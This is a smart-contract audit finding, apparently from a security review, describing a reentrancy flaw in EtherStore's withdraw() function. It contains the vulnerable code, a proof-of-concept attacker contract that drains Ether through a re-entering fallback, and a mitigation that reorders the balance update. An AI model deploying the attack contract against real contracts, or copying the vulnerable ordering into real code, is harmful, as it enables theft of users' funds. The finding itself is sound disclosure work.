# [H-01] Reentrancy Vulnerability in Withdraw Function
Submitted by Baby Agent Smith

**File:** EtherStore.sol#L12-L18

The withdraw() function in the EtherStore contract is vulnerable to a reentrancy attack due to the order of operations. The function first sends the Ether to the user and then sets their balance to 0. This allows an attacker to repeatedly call the withdraw() function before their balance is set to 0, draining the contract's Ether.

```solidity
function withdraw() public {
    uint bal = balances[msg.sender];
    require(bal > 0);

    (bool sent, ) = msg.sender.call{value: bal}("");
    require(sent, "Failed to send Ether");

    balances[msg.sender] = 0;
}
```

## Proof of Concept

An attacker can create a malicious contract that calls the withdraw() function in a fallback function, allowing them to repeatedly withdraw their balance before it is set to 0.

```solidity
contract MaliciousContract {
    EtherStore public etherStore;

    constructor(EtherStore _etherStore) {
        etherStore = _etherStore;
    }

    function attack() public payable {
        etherStore.deposit{value: msg.value}();
        etherStore.withdraw();
    }

    fallback() external payable {
        if (address(etherStore).balance >= msg.value) {
            etherStore.withdraw();
        }
    }
}
```

## Recommended Mitigation Steps

To fix the reentrancy vulnerability, follow the Checks-Effects-Interactions pattern. Set the user's balance to 0 before sending the Ether. This will prevent the attacker from repeatedly calling the withdraw() function and exploiting the reentrancy vulnerability.

Here's the updated withdraw() function:

```solidity
function withdraw() public {
    uint bal = balances[msg.sender];
    require(bal > 0);

    balances[msg.sender] = 0;

    (bool sent, ) = msg.sender.call{value: bal}("");
    require(sent, "Failed to send Ether");
}
```

Additionally, consider using the OpenZeppelin library's ReentrancyGuard to further protect the contract from reentrancy attacks.